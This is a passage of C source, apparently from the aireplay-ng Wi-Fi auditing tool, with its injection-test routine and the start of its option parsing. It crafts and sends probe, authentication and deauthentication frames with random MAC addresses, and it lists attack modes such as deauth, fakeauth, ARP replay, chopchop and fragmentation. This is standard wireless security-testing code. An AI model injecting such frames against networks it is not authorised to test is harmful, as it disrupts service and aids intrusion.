s_in.sin_family = PF_INET;\n    s_in.sin_port = htons(port);\n    if (!inet_aton(ip_str, &s_in.sin_addr))\n            return -1;\n\n    if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)\n            return -1;\n\n    /* avoid blocking on reading the socket */\n    if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )\n    {\n        perror( \"fcntl(O_NONBLOCK) failed\" );\n        return( 1 );\n    }\n\n    gettimeofday( &tv, NULL );\n\n    while (1)  //waiting for relayed packet\n    {\n        if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)\n        {\n            if(errno != EINPROGRESS && errno != EALREADY)\n            {\n                perror(\"connect\");\n                close(sock);\n\n                printf(\"Failed to connect\\n\");\n\n                return -1;\n            }\n        }\n        else\n        {\n            gettimeofday( &tv2, NULL );\n            break;\n        }\n\n        gettimeofday( &tv2, NULL );\n        //wait 3000ms for a successful connect\n        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3000*1000))\n        {\n            printf(\"Connection timed out\\n\");\n            close(sock);\n            return(-1);\n        }\n        usleep(10);\n    }\n\n    PCT; printf(\"TCP connection successful\\n\");\n\n    //trying to identify airserv-ng\n    memset(&nh, 0, sizeof(nh));\n//     command: GET_CHAN\n    nh.nh_type\t= 2;\n    nh.nh_len\t= htonl(0);\n\n    if (send(sock, &nh, sizeof(nh), 0) != sizeof(nh))\n    {\n        perror(\"send\");\n        return -1;\n    }\n\n    gettimeofday( &tv, NULL );\n    i=0;\n\n    while (1)  //waiting for GET_CHAN answer\n    {\n        caplen = read(sock, &nh, sizeof(nh));\n\n        if(caplen == -1)\n        {\n            if( errno != EAGAIN )\n            {\n                perror(\"read\");\n                return -1;\n            }\n        }\n\n        if( (unsigned)caplen == sizeof(nh))\n        {\n            len = ntohl(nh.nh_len);\n            if( nh.nh_type == 1 && i==0 )\n            {\n                i=1;\n                caplen = read(sock, packet, len);\n                if(caplen == len)\n                {\n                    i=2;\n                    break;\n                }\n                else\n                {\n                    i=0;\n                }\n            }\n            else\n            {\n                caplen = read(sock, packet, len);\n            }\n        }\n\n        gettimeofday( &tv2, NULL );\n        //wait 1000ms for an answer\n        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))\n        {\n            break;\n        }\n        if(caplen == -1)\n            usleep(10);\n    }\n\n    if(i==2)\n    {\n        PCT; printf(\"airserv-ng found\\n\");\n    }\n    else\n    {\n        PCT; printf(\"airserv-ng NOT found\\n\");\n    }\n\n    close(sock);\n\n    for(i=0; i<REQUESTS; i++)\n    {\n        if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)\n                return -1;\n\n        /* avoid blocking on reading the socket */\n        if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n\n        usleep(1000);\n\n        gettimeofday( &tv, NULL );\n\n        while (1)  //waiting for relayed packet\n        {\n            if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)\n            {\n                if(errno != EINPROGRESS && errno != EALREADY)\n                {\n                    perror(\"connect\");\n                    close(sock);\n\n                    printf(\"Failed to connect\\n\");\n\n                    return -1;\n                }\n            }\n            else\n            {\n                gettimeofday( &tv2, NULL );\n                break;\n            }\n\n            gettimeofday( &tv2, NULL );\n            //wait 1000ms for a successful connect\n            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))\n            {\n                break;\n            }\n            //simple \"high-precision\" usleep\n            select(1, NULL, NULL, NULL, &tv3);\n        }\n        times[i] = ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec));\n        printf( \"\\r%d/%d\\r\", i, REQUESTS);\n        fflush(stdout);\n        close(sock);\n    }\n\n    min = INT_MAX;\n    avg = 0;\n    max = 0;\n\n    for(i=0; i<REQUESTS; i++)\n    {\n        if(times[i] < min) min = times[i];\n        if(times[i] > max) max = times[i];\n        avg += times[i];\n    }\n    avg /= REQUESTS;\n\n    PCT; printf(\"ping %s:%d (min/avg/max): %.3fms/%.3fms/%.3fms\\n\", ip_str, port, min/1000.0, avg/1000.0, max/1000.0);\n\n    return 0;\n}\n\nint do_attack_test()\n{\n    unsigned char packet[4096];\n    struct timeval tv, tv2, tv3;\n    int len=0, i=0, j=0, k=0;\n    int gotit=0, answers=0, found=0;\n    int caplen=0, essidlen=0;\n    unsigned int min, avg, max;\n    int ret=0;\n    float avg2;\n    struct rx_info ri;\n    int atime=200;  //time in ms to wait for answer packet (needs to be higher for airserv)\n    unsigned char nulldata[1024];\n\n    if(opt.port_out > 0)\n    {\n        atime += 200;\n        PCT; printf(\"Testing connection to injection device %s\\n\", opt.iface_out);\n        ret = tcp_test(opt.ip_out, opt.port_out);\n        if(ret != 0)\n        {\n            return( 1 );\n        }\n        printf(\"\\n\");\n\n        /* open the replay interface */\n        _wi_out = wi_open(opt.iface_out);\n        if (!_wi_out)\n            return 1;\n        printf(\"\\n\");\n        dev.fd_out = wi_fd(_wi_out);\n        wi_get_mac(_wi_out, dev.mac_out);\n        if(opt.s_face == NULL)\n        {\n            _wi_in = _wi_out;\n            dev.fd_in = dev.fd_out;\n\n            /* XXX */\n            dev.arptype_in = dev.arptype_out;\n            wi_get_mac(_wi_in, dev.mac_in);\n        }\n    }\n\n    if(opt.s_face && opt.port_in > 0)\n    {\n        atime += 200;\n        PCT; printf(\"Testing connection to capture device %s\\n\", opt.s_face);\n        ret = tcp_test(opt.ip_in, opt.port_in);\n        if(ret != 0)\n        {\n            return( 1 );\n        }\n        printf(\"\\n\");\n\n        /* open the packet source */\n        _wi_in = wi_open(opt.s_face);\n        if (!_wi_in)\n            return 1;\n        dev.fd_in = wi_fd(_wi_in);\n        wi_get_mac(_wi_in, dev.mac_in);\n        printf(\"\\n\");\n    }\n    else if(opt.s_face && opt.port_in <= 0)\n    {\n        _wi_in = wi_open(opt.s_face);\n        if (!_wi_in)\n            return 1;\n        dev.fd_in = wi_fd(_wi_in);\n        wi_get_mac(_wi_in, dev.mac_in);\n        printf(\"\\n\");\n    }\n\n    if(opt.port_in <= 0)\n    {\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    if(getnet(NULL, 0, 0) != 0)\n        return 1;\n\n    srand( time( NULL ) );\n\n    memset(ap, '\\0', 20*sizeof(struct APt));\n\n    essidlen = strlen(opt.r_essid);\n    if( essidlen > 250) essidlen = 250;\n\n    if( essidlen > 0 )\n    {\n        ap[0].set = 1;\n        ap[0].found = 0;\n        ap[0].len = essidlen;\n        memcpy(ap[0].essid, opt.r_essid, essidlen);\n        ap[0].essid[essidlen] = '\\0';\n        memcpy(ap[0].bssid, opt.r_bssid, 6);\n        found++;\n    }\n\n    if(opt.bittest)\n        set_bitrate(_wi_out, RATE_1M);\n\n    PCT; printf(\"Trying broadcast probe requests...\\n\");\n\n    memcpy(h80211, PROBE_REQ, 24);\n\n    len = 24;\n\n    h80211[24] = 0x00;      //ESSID Tag Number\n    h80211[25] = 0x00;      //ESSID Tag Length\n\n    len += 2;\n\n    memcpy(h80211+len, RATES, 16);\n\n    len += 16;\n\n    gotit=0;\n    answers=0;\n    for(i=0; i<3; i++)\n    {\n        /*\n            random source so we can identify our packets\n        */\n        opt.r_smac[0] = 0x00;\n        opt.r_smac[1] = rand() & 0xFF;\n        opt.r_smac[2] = rand() & 0xFF;\n        opt.r_smac[3] = rand() & 0xFF;\n        opt.r_smac[4] = rand() & 0xFF;\n        opt.r_smac[5] = rand() & 0xFF;\n\n        memcpy(h80211+10, opt.r_smac, 6);\n\n        send_packet(h80211, len);\n\n        gettimeofday( &tv, NULL );\n\n        while (1)  //waiting for relayed packet\n        {\n            caplen = read_packet(packet, sizeof(packet), &ri);\n\n            if (packet[0] == 0x50 ) //Is probe response\n            {\n                if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                {\n                    if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))\n                    {\n                        found++;\n                    }\n                    if(!answers)\n                    {\n                        PCT; printf(\"Injection is working!\\n\");\n                        if(opt.fast) return 0;\n                        gotit=1;\n                        answers++;\n                    }\n                }\n            }\n\n            if (packet[0] == 0x80 ) //Is beacon frame\n            {\n                if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))\n                {\n                    found++;\n                }\n            }\n\n            gettimeofday( &tv2, NULL );\n            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 'atime'ms for an answer\n            {\n                break;\n            }\n        }\n    }\n    if(answers == 0)\n    {\n        PCT; printf(\"No Answer...\\n\");\n    }\n\n    PCT; printf(\"Found %d AP%c\\n\", found, ((found == 1) ? ' ' : 's' ) );\n\n    if(found > 0)\n    {\n        printf(\"\\n\");\n        PCT; printf(\"Trying directed probe requests...\\n\");\n    }\n\n    for(i=0; i<found; i++)\n    {\n        if(wi_get_channel(_wi_out) != ap[i].chan)\n        {\n            wi_set_channel(_wi_out, ap[i].chan);\n        }\n\n        if(wi_get_channel(_wi_in) != ap[i].chan)\n        {\n            wi_set_channel(_wi_in, ap[i].chan);\n        }\n\n        PCT; printf(\"%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \\'%s\\'\\n\", ap[i].bssid[0], ap[i].bssid[1],\n                    ap[i].bssid[2], ap[i].bssid[3], ap[i].bssid[4], ap[i].bssid[5], ap[i].chan, ap[i].essid);\n\n        ap[i].found=0;\n        min = INT_MAX;\n        max = 0;\n        avg = 0;\n        avg2 = 0;\n\n        memcpy(h80211, PROBE_REQ, 24);\n\n        len = 24;\n\n        h80211[24] = 0x00;      //ESSID Tag Number\n        h80211[25] = ap[i].len; //ESSID Tag Length\n        memcpy(h80211+len+2, ap[i].essid, ap[i].len);\n\n        len += ap[i].len+2;\n\n        memcpy(h80211+len, RATES, 16);\n\n        len += 16;\n\n        for(j=0; j<REQUESTS; j++)\n        {\n            /*\n                random source so we can identify our packets\n            */\n            opt.r_smac[0] = 0x00;\n            opt.r_smac[1] = rand() & 0xFF;\n            opt.r_smac[2] = rand() & 0xFF;\n            opt.r_smac[3] = rand() & 0xFF;\n            opt.r_smac[4] = rand() & 0xFF;\n            opt.r_smac[5] = rand() & 0xFF;\n\n            //build/send probe request\n            memcpy(h80211+10, opt.r_smac, 6);\n\n            send_packet(h80211, len);\n            usleep(10);\n\n            //build/send request-to-send\n            memcpy(nulldata, RTS, 16);\n            memcpy(nulldata+4, ap[i].bssid, 6);\n            memcpy(nulldata+10, opt.r_smac, 6);\n\n            send_packet(nulldata, 16);\n            usleep(10);\n\n            //build/send null data packet\n            memcpy(nulldata, NULL_DATA, 24);\n            memcpy(nulldata+4, ap[i].bssid, 6);\n            memcpy(nulldata+10, opt.r_smac, 6);\n            memcpy(nulldata+16, ap[i].bssid, 6);\n\n            send_packet(nulldata, 24);\n            usleep(10);\n\n            //build/send auth request packet\n            memcpy(nulldata, AUTH_REQ, 30);\n            memcpy(nulldata+4, ap[i].bssid, 6);\n            memcpy(nulldata+10, opt.r_smac, 6);\n            memcpy(nulldata+16, ap[i].bssid, 6);\n\n            send_packet(nulldata, 30);\n\n            //continue\n            gettimeofday( &tv, NULL );\n\n            printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n            fflush(stdout);\n            while (1)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), &ri);\n\n                if (packet[0] == 0x50 ) //Is probe response\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        if(! memcmp(ap[i].bssid, packet+16, 6)) //From the mentioned AP\n                        {\n                            gettimeofday( &tv3, NULL);\n                            ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));\n                            if(!answers)\n                            {\n                                if(opt.fast)\n                                {\n                                    PCT; printf(\"Injection is working!\\n\\n\");\n                                    return 0;\n                                }\n                                answers++;\n                            }\n                            ap[i].found++;\n                            if((signed)ri.ri_power > -200)\n                                ap[i].pwr[j] = (signed)ri.ri_power;\n                            break;\n                        }\n                    }\n                }\n\n                if (packet[0] == 0xC4 ) //Is clear-to-send\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        gettimeofday( &tv3, NULL);\n                        ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));\n                        if(!answers)\n                        {\n                            if(opt.fast)\n                            {\n                                PCT; printf(\"Injection is working!\\n\\n\");\n                                return 0;\n                            }\n                            answers++;\n                        }\n                        ap[i].found++;\n                        if((signed)ri.ri_power > -200)\n                            ap[i].pwr[j] = (signed)ri.ri_power;\n                        break;\n                    }\n                }\n\n                if (packet[0] == 0xD4 ) //Is ack\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        gettimeofday( &tv3, NULL);\n                        ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));\n                        if(!answers)\n                        {\n                            if(opt.fast)\n                            {\n                                PCT; printf(\"Injection is working!\\n\\n\");\n                                return 0;\n                            }\n                            answers++;\n                        }\n                        ap[i].found++;\n                        if((signed)ri.ri_power > -200)\n                            ap[i].pwr[j] = (signed)ri.ri_power;\n                        break;\n                    }\n                }\n\n                if (packet[0] == 0xB0 ) //Is auth response\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        if (! memcmp(packet+10, packet+16, 6)) //From BSS ID\n                        {\n                            gettimeofday( &tv3, NULL);\n                            ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));\n                            if(!answers)\n                            {\n                                if(opt.fast)\n                                {\n                                    PCT; printf(\"Injection is working!\\n\\n\");\n                                    return 0;\n                                }\n                                answers++;\n                            }\n                            ap[i].found++;\n                            if((signed)ri.ri_power > -200)\n                                ap[i].pwr[j] = (signed)ri.ri_power;\n                            break;\n                        }\n                    }\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (atime*1000)) //wait 'atime'ms for an answer\n                {\n                    break;\n                }\n                usleep(10);\n            }\n            printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n            fflush(stdout);\n        }\n        for(j=0; j<REQUESTS; j++)\n        {\n            if(ap[i].ping[j] > 0)\n            {\n                if(ap[i].ping[j] > max) max = ap[i].ping[j];\n                if(ap[i].ping[j] < min) min = ap[i].ping[j];\n                avg += ap[i].ping[j];\n                avg2 += ap[i].pwr[j];\n            }\n        }\n        if(ap[i].found > 0)\n        {\n            avg /= ap[i].found;\n            avg2 /= ap[i].found;\n            PCT; printf(\"Ping (min/avg/max): %.3fms/%.3fms/%.3fms Power: %.2f\\n\", (min/1000.0), (avg/1000.0), (max/1000.0), avg2);\n        }\n        PCT; printf(\"%2d/%2d: %3d%%\\n\\n\", ap[i].found, REQUESTS, ((ap[i].found*100)/REQUESTS));\n\n        if(!gotit && answers)\n        {\n            PCT; printf(\"Injection is working!\\n\\n\");\n            gotit=1;\n        }\n    }\n\n    if(opt.bittest)\n    {\n        if(found > 0)\n        {\n            PCT; printf(\"Trying directed probe requests for all bitrates...\\n\");\n        }\n\n        for(i=0; i<found; i++)\n        {\n            if(ap[i].found <= 0)\n                continue;\n            printf(\"\\n\");\n            PCT; printf(\"%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \\'%s\\'\\n\", ap[i].bssid[0], ap[i].bssid[1],\n                        ap[i].bssid[2], ap[i].bssid[3], ap[i].bssid[4], ap[i].bssid[5], ap[i].chan, ap[i].essid);\n\n            min = INT_MAX;\n            max = 0;\n            avg = 0;\n\n            memcpy(h80211, PROBE_REQ, 24);\n\n            len = 24;\n\n            h80211[24] = 0x00;      //ESSID Tag Number\n            h80211[25] = ap[i].len; //ESSID Tag Length\n            memcpy(h80211+len+2, ap[i].essid, ap[i].len);\n\n            len += ap[i].len+2;\n\n            memcpy(h80211+len, RATES, 16);\n\n            len += 16;\n\n            for(k=0; k<RATE_NUM; k++)\n            {\n                ap[i].found=0;\n                if(set_bitrate(_wi_out, bitrates[k]))\n                    continue;\n\n\n                avg2 = 0;\n                memset(ap[i].pwr, 0, REQUESTS*sizeof(unsigned int));\n\n                for(j=0; j<REQUESTS; j++)\n                {\n                    /*\n                        random source so we can identify our packets\n                    */\n                    opt.r_smac[0] = 0x00;\n                    opt.r_smac[1] = rand() & 0xFF;\n                    opt.r_smac[2] = rand() & 0xFF;\n                    opt.r_smac[3] = rand() & 0xFF;\n                    opt.r_smac[4] = rand() & 0xFF;\n                    opt.r_smac[5] = rand() & 0xFF;\n\n                    memcpy(h80211+10, opt.r_smac, 6);\n\n                    send_packet(h80211, len);\n\n                    gettimeofday( &tv, NULL );\n\n                    printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n                    fflush(stdout);\n                    while (1)  //waiting for relayed packet\n                    {\n                        caplen = read_packet(packet, sizeof(packet), &ri);\n\n                        if (packet[0] == 0x50 ) //Is probe response\n                        {\n                            if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                            {\n                                if(! memcmp(ap[i].bssid, packet+16, 6)) //From the mentioned AP\n                                {\n                                    if(!answers)\n                                    {\n                                        answers++;\n                                    }\n                                    ap[i].found++;\n                                    if((signed)ri.ri_power > -200)\n                                        ap[i].pwr[j] = (signed)ri.ri_power;\n                                    break;\n                                }\n                            }\n                        }\n\n                        gettimeofday( &tv2, NULL );\n                        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000)) //wait 300ms for an answer\n                        {\n                            break;\n                        }\n                        usleep(10);\n                    }\n                    printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n                    fflush(stdout);\n                }\n                for(j=0; j<REQUESTS; j++)\n                    avg2 += ap[i].pwr[j];\n                if(ap[i].found > 0)\n                    avg2 /= ap[i].found;\n                PCT; printf(\"Probing at %2.1f Mbps:\\t%2d/%2d: %3d%%\\n\", wi_get_rate(_wi_out)/1000000.0,\n                            ap[i].found, REQUESTS, ((ap[i].found*100)/REQUESTS));\n            }\n\n            if(!gotit && answers)\n            {\n                PCT; printf(\"Injection is working!\\n\\n\");\n                if(opt.fast) return 0;\n                gotit=1;\n            }\n        }\n    }\n    if(opt.bittest)\n        set_bitrate(_wi_out, RATE_1M);\n\n    if( opt.s_face != NULL )\n    {\n        printf(\"\\n\");\n        PCT; printf(\"Trying card-to-card injection...\\n\");\n\n        /* sync both cards to the same channel, or the test will fail */\n        if(wi_get_channel(_wi_out) != wi_get_channel(_wi_in))\n        {\n            wi_set_channel(_wi_out, wi_get_channel(_wi_in));\n        }\n\n        /* Attacks */\n        for(i=0; i<5; i++)\n        {\n            k=0;\n            /* random macs */\n            opt.f_smac[0] = 0x00;\n            opt.f_smac[1] = rand() & 0xFF;\n            opt.f_smac[2] = rand() & 0xFF;\n            opt.f_smac[3] = rand() & 0xFF;\n            opt.f_smac[4] = rand() & 0xFF;\n            opt.f_smac[5] = rand() & 0xFF;\n\n            opt.f_dmac[0] = 0x00;\n            opt.f_dmac[1] = rand() & 0xFF;\n            opt.f_dmac[2] = rand() & 0xFF;\n            opt.f_dmac[3] = rand() & 0xFF;\n            opt.f_dmac[4] = rand() & 0xFF;\n            opt.f_dmac[5] = rand() & 0xFF;\n\n            opt.f_bssid[0] = 0x00;\n            opt.f_bssid[1] = rand() & 0xFF;\n            opt.f_bssid[2] = rand() & 0xFF;\n            opt.f_bssid[3] = rand() & 0xFF;\n            opt.f_bssid[4] = rand() & 0xFF;\n            opt.f_bssid[5] = rand() & 0xFF;\n\n            if(i==0) //attack -0\n            {\n                memcpy( h80211, DEAUTH_REQ, 26 );\n                memcpy( h80211 + 16, opt.f_bssid, 6 );\n                memcpy( h80211 +  4, opt.f_dmac,  6 );\n                memcpy( h80211 + 10, opt.f_smac, 6 );\n\n                opt.f_iswep = 0;\n                opt.f_tods = 0; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 26;\n            }\n            else if(i==1) //attack -1 (open)\n            {\n                memcpy( h80211, AUTH_REQ, 30 );\n                memcpy( h80211 +  4, opt.f_dmac, 6 );\n                memcpy( h80211 + 10, opt.f_smac , 6 );\n                memcpy( h80211 + 16, opt.f_bssid, 6 );\n\n                opt.f_iswep = 0;\n                opt.f_tods = 0; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 30;\n            }\n            else if(i==2) //attack -1 (psk)\n            {\n                memcpy( h80211, ska_auth3, 24);\n                memcpy( h80211 +  4, opt.f_dmac, 6);\n                memcpy( h80211 + 10, opt.f_smac,  6);\n                memcpy( h80211 + 16, opt.f_bssid, 6);\n\n                //iv+idx\n                h80211[24] = 0x86;\n                h80211[25] = 0xD8;\n                h80211[26] = 0x2E;\n                h80211[27] = 0x00;\n\n                //random bytes (as encrypted data)\n                for(j=0; j<132; j++)\n                    h80211[28+j] = rand() & 0xFF;\n\n                opt.f_iswep = 1;\n                opt.f_tods = 0; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 24+4+132;\n            }\n            else if(i==3) //attack -3\n            {\n                memcpy( h80211, NULL_DATA, 24);\n                memcpy( h80211 +  4, opt.f_bssid, 6);\n                memcpy( h80211 + 10, opt.f_smac,  6);\n                memcpy( h80211 + 16, opt.f_dmac, 6);\n\n                //iv+idx\n                h80211[24] = 0x86;\n                h80211[25] = 0xD8;\n                h80211[26] = 0x2E;\n                h80211[27] = 0x00;\n\n                //random bytes (as encrypted data)\n                for(j=0; j<132; j++)\n                    h80211[28+j] = rand() & 0xFF;\n\n                opt.f_iswep = -1;\n                opt.f_tods = 1; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 24+4+132;\n            }\n            else if(i==4) //attack -5\n            {\n                memcpy( h80211, NULL_DATA, 24);\n                memcpy( h80211 +  4, opt.f_bssid, 6);\n                memcpy( h80211 + 10, opt.f_smac,  6);\n                memcpy( h80211 + 16, opt.f_dmac, 6);\n\n                h80211[1] |= 0x04;\n                h80211[22] = 0x0A;\n                h80211[23] = 0x00;\n\n                //iv+idx\n                h80211[24] = 0x86;\n                h80211[25] = 0xD8;\n                h80211[26] = 0x2E;\n                h80211[27] = 0x00;\n\n                //random bytes (as encrypted data)\n                for(j=0; j<7; j++)\n                    h80211[28+j] = rand() & 0xFF;\n\n                opt.f_iswep = -1;\n                opt.f_tods = 1; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 24+4+7;\n            }\n\n            for(j=0; (j<(REQUESTS/4) && !k); j++) //try it 5 times\n            {\n                send_packet( h80211, opt.f_minlen );\n\n                gettimeofday( &tv, NULL );\n                while (1)  //waiting for relayed packet\n                {\n                    caplen = read_packet(packet, sizeof(packet), &ri);\n                    if ( filter_packet(packet, caplen) == 0 ) //got same length and same type\n                    {\n                        if(!answers)\n                        {\n                            answers++;\n                        }\n\n                        if(i == 0) //attack -0\n                        {\n                            if( h80211[0] == packet[0] )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==1) //attack -1 (open)\n                        {\n                            if( h80211[0] == packet[0] )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==2) //attack -1 (psk)\n                        {\n                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==3) //attack -2/-3/-4/-6\n                        {\n                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==4) //attack -5/-7\n                        {\n                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )\n                            {\n                               if( (packet[1] & 0x04) && memcmp( h80211+22, packet+22, 2 ) == 0 )\n                               {\n                                    k=1;\n                                    break;\n                               }\n                            }\n                        }\n                    }\n\n                    gettimeofday( &tv2, NULL );\n                    if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 3*'atime' ms for an answer\n                    {\n                        break;\n                    }\n                    usleep(10);\n                }\n            }\n            if(k)\n            {\n                k=0;\n                if(i==0) //attack -0\n                {\n                    PCT; printf(\"Attack -0:           OK\\n\");\n                }\n                else if(i==1) //attack -1 (open)\n                {\n                    PCT; printf(\"Attack -1 (open):    OK\\n\");\n                }\n                else if(i==2) //attack -1 (psk)\n                {\n                    PCT; printf(\"Attack -1 (psk):     OK\\n\");\n                }\n                else if(i==3) //attack -3\n                {\n                    PCT; printf(\"Attack -2/-3/-4/-6:  OK\\n\");\n                }\n                else if(i==4) //attack -5\n                {\n                    PCT; printf(\"Attack -5/-7:        OK\\n\");\n                }\n            }\n            else\n            {\n                if(i==0) //attack -0\n                {\n                    PCT; printf(\"Attack -0:           Failed\\n\");\n                }\n                else if(i==1) //attack -1 (open)\n                {\n                    PCT; printf(\"Attack -1 (open):    Failed\\n\");\n                }\n                else if(i==2) //attack -1 (psk)\n                {\n                    PCT; printf(\"Attack -1 (psk):     Failed\\n\");\n                }\n                else if(i==3) //attack -3\n                {\n                    PCT; printf(\"Attack -2/-3/-4/-6:  Failed\\n\");\n                }\n                else if(i==4) //attack -5\n                {\n                    PCT; printf(\"Attack -5/-7:        Failed\\n\");\n                }\n            }\n        }\n\n        if(!gotit && answers)\n        {\n            PCT; printf(\"Injection is working!\\n\");\n            if(opt.fast) return 0;\n            gotit=1;\n        }\n    }\n    return 0;\n}\n\nint main( int argc, char *argv[] )\n{\n    int n, i, ret;\n\n    /* check the arguments */\n\n    memset( &opt, 0, sizeof( opt ) );\n    memset( &dev, 0, sizeof( dev ) );\n\n    opt.f_type    = -1; opt.f_subtype   = -1;\n    opt.f_minlen  = -1; opt.f_maxlen    = -1;\n    opt.f_tods    = -1; opt.f_fromds    = -1;\n    opt.f_iswep   = -1; opt.ringbuffer  =  8;\n\n    opt.a_mode    = -1; opt.r_fctrl     = -1;\n    opt.ghost     =  0;\n    opt.delay     = 15; opt.bittest     =  0;\n    opt.fast      =  0; opt.r_smac_set  =  0;\n    opt.npackets  =  1; opt.nodetect    =  0;\n    opt.rtc       =  1; opt.f_retry\t=  0;\n    opt.reassoc   =  0;\n\n/* XXX */\n#if 0\n#if defined(__FreeBSD__)\n    /*\n        check what is our FreeBSD version. injection works\n        only on 7-CURRENT so abort if it's a lower version.\n    */\n    if( __FreeBSD_version < 700000 )\n    {\n        fprintf( stderr, \"Aireplay-ng does not work on this \"\n            \"release of FreeBSD.\\n\" );\n        exit( 1 );\n    }\n#endif\n#endif\n\n    while( 1 )\n    {\n        int option_index = 0;\n\n        static struct option long_options[] = {\n            {\"deauth\",      1, 0, '0'},\n            {\"fakeauth\",    1, 0, '1'},\n            {\"interactive\", 0, 0, '2'},\n            {\"arpreplay\",   0, 0, '3'},\n            {\"chopchop\",    0, 0, '4'},\n            {\"fragment\",    0, 0, '5'},\n            {\"caffe-latte\", 0, 0, '6'},\n            {\"cfrag\",       0, 0, '7'},\n            {\"test\",        0, 0, '9'},\n            {\"help\",        0, 0, 'H'},\n            {\"fast\",        0, 0, 'F'},\n            {\"bittest\",     0, 0, 'B'},\n            {\"migmode\",     0, 0, '8'},\n            {\"ignore-negative-one\", 0, &opt.ignore_negative_one, 1},\n            {0,             0, 0,  0 }\n        };\n\n        int option = getopt_long( argc, argv,\n                        \"b:d:s:m:n:u:v:t:T:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:Q0:1:23456789HFBDR\",\n                        long_options, &option_index );\n\n        if( option < 0 ) break;\n\n        switch( option )\n        {\n            case 0 :\n\n                break;\n\n            case ':' :\n\n                printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                return( 1 );\n\n            case '?' :\n\n                printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                return( 1 );\n\n            case 'b' :\n\n                if( getmac( optarg, 1 ,opt.f_bssid ) != 0 )\n                {\n                    printf( \"Invalid BSSID (AP MAC address).\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'd' :\n\n                if( getmac( optarg, 1, opt.f_dmac ) != 0 )\n                {\n                    printf( \"Invalid destination MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 's' :\n\n                if( getmac( optarg, 1, opt.f_smac ) != 0 )\n                {\n                    printf( \"Invalid source MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'm' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_minlen );\n                if( opt.f_minlen < 0 || ret != 1 )\n                {\n                    printf( \"Invalid minimum length filter. 